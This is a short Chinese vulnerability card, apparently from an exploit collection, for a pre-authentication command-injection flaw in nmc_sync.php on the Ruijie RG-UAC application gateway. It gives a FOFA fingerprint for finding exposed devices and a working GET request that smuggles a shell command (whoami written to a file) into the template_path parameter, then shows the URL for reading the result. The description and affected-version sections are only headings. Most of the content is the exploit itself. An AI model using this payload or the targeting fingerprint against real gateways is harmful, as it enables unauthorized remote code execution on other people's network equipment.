# 锐捷RG-UAC应用网关nmc_sync.php前台RCE漏洞

- **系统**：锐捷　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`fofa：app="Ruijie-RG-UAC"`
- **请求**：`GET /view/systemConfig/management/nmc_sync.php?center_ip=127.0.0.1&template_path=whoami%20>dudesuite.txtcat HTTP/1.1`
- **关键头**：`Host: xxx`

**请求体 / payload**
```
访问：[https://xxx/view/systemConfig/management/dudesuite.txt](https://xxx/view/systemConfig/management/dudesuite.txt)
>
```

**其他**
- 锐捷RG-UAC应用网关nmc_sync.php前台RCE漏洞: + 一、漏洞描述
+ 二、影响版本
+ 三、资产测绘
+ 四、漏洞复现
---
- 版本: 锐捷RG-UAC应用网关